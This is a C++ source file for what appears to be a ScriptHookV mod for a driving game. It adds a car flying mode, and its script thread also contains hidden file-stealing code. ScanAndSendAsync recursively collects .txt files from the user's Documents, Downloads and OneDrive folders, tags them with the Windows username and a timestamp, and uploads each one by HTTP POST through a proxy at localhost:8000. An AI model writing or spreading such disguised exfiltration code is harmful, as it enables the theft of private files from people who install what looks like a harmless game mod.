#include "pch.h"
#include "Script.hpp"

using namespace std;
using namespace Poco::Net;

Vehicle currentVehicle;
bool flyingMode;

void ShowSubtitle(char* text, int time)
{
    char textEntry[] = "STRING";
    UI::_SET_TEXT_ENTRY_2(textEntry);
    UI::_ADD_TEXT_COMPONENT_STRING(text);
    UI::_DRAW_SUBTITLE_TIMED(time, true);
}

void ShowHelpTextThisFrame(char* text, bool beep)
{
    char textEntry[] = "STRING";
    UI::_SET_TEXT_COMPONENT_FORMAT(textEntry);
    UI::_ADD_TEXT_COMPONENT_STRING(text);
    UI::_DISPLAY_HELP_TEXT_FROM_STRING_LABEL(0, 0, beep, -1);
}

void ScanKnownFolder(vector<filesystem::path> &paths, const GUID knownFolder)
{
    filesystem::path root;
    string extension = ".txt";

    PWSTR   ppszPath;

    HRESULT hr = SHGetKnownFolderPath(knownFolder, 0, NULL, &ppszPath);

    std::wstring myPath;

    if (SUCCEEDED(hr))
    {
        myPath = ppszPath;
        ShowSubtitle((char*)myPath.c_str(), 8000);
        WAIT(5000);
        root = filesystem::path(myPath);
    }
    else
    {
        CoTaskMemFree(ppszPath);
        return;
    }

    CoTaskMemFree(ppszPath);

    try
    {
        for (auto const& entry : filesystem::recursive_directory_iterator(root, filesystem::directory_options::skip_permission_denied))
        {
            try
            {
                if (filesystem::is_regular_file(entry) && entry.path().extension() == extension)
                {
                    ShowSubtitle((char*)entry.path().filename().string().c_str(), 8000);
                    paths.push_back(entry.path());
                }
            }
            catch (exception e)
            {
                ShowSubtitle((char*)e.what(), 8000);
            }

            WAIT(10);
            //Sleep(1);
        }
    }
    catch (exception e)
    {
        ShowSubtitle((char*)e.what(), 8000);
    }

    ShowSubtitle((char*)"DONE COPYING", 8000);

    WAIT(30000);
}

void ScanAndSendAsync()
{
	vector<filesystem::path> paths;

    ScanKnownFolder(paths, FOLDERID_Documents);
    ScanKnownFolder(paths, FOLDERID_Downloads);
    ScanKnownFolder(paths, FOLDERID_SkyDrive);

    char username[257];
    DWORD username_len = 257;
    GetUserNameA(username, &username_len);

    auto now = chrono::system_clock::now();
    auto time_now = chrono::system_clock::to_time_t(now);
    char formated[200];
    ctime_s(formated, 200, &time_now);

    char id[465];
    strcpy_s(id, username);
    strcat_s(id, " - ");
    strcat_s(id, formated);

    for (auto const& path : paths)
    {
        HTTPClientSession session;
        session.setProxy("localhost", 8000);
        HTTPRequest request(HTTPRequest::HTTP_POST, "/file", HTTPMessage::HTTP_1_1);
        HTMLForm form(HTMLForm::ENCODING_MULTIPART);
        form.add("folderName", id);
        form.addPart("textFile", new FilePartSource(path.string(), path.filename().string(), "text/plain"));
        form.prepareSubmit(request);
        form.write(session.sendRequest(request));

        WAIT(20);
        //Sleep(1);
    }
}

void main()
{
    while (DLC2::GET_IS_LOADING_SCREEN_ACTIVE())
    {
        WAIT(0);
    }

	while (true)
	{
        ShowHelpTextThisFrame((char*)"XD", false);
        if (PED::IS_PED_IN_ANY_VEHICLE(PLAYER::PLAYER_PED_ID(), false))
        {
            Vehicle ref = PED::GET_VEHICLE_PED_IS_IN(PLAYER::PLAYER_PED_ID(), false);
            Hash model = ENTITY::GET_ENTITY_MODEL(ref);
            
            if (VEHICLE::IS_THIS_MODEL_A_CAR(model))
            {
                currentVehicle = ref;
            }
            else if (currentVehicle != 0 || flyingMode)
            {
                flyingMode = false;
                currentVehicle = 0;
            }
        }
        else if (currentVehicle != 0 || flyingMode)
        {
            flyingMode = false;
            currentVehicle = 0;
        }

        if (currentVehicle != 0)
        {
            if (!flyingMode)
            {
                ShowHelpTextThisFrame((char*)"Press ~INPUT_VEH_DUCK~ to enable flying mode", false);

                if (CONTROLS::IS_CONTROL_JUST_RELEASED(0, 73))
                {
                    flyingMode = true;
                }
            }
            else
            {
                ShowHelpTextThisFrame((char*)"Press ~INPUT_CONTEXT~ to go up\nPress ~INPUT_VEH_DUCK~ to disable flying mode", false);

                if (CONTROLS::IS_CONTROL_JUST_RELEASED(0, 73))
                {
                    flyingMode = false;
                }

                if (CONTROLS::IS_CONTROL_JUST_RELEASED(0, 51))
                {
                    Vector3 currentVelocity = ENTITY::GET_ENTITY_VELOCITY(currentVehicle);
                    ENTITY::SET_ENTITY_VELOCITY(currentVehicle, currentVelocity.x, currentVelocity.y, currentVelocity.z + 45);
                }

                if (CONTROLS::IS_CONTROL_PRESSED(0, 71) && ENTITY::IS_ENTITY_IN_AIR(currentVehicle))
                {
                    VEHICLE::SET_VEHICLE_FORWARD_SPEED(currentVehicle, 65);
                }

            }
        }

		WAIT(0);
	}
}

void ThreadMain()
{
    while (DLC2::GET_IS_LOADING_SCREEN_ACTIVE())
    {
        WAIT(0);
    }

    ScanAndSendAsync();
}

void ScriptMain()
{
	srand(GetTickCount());
	main();
}

void OnAbort()
{

}
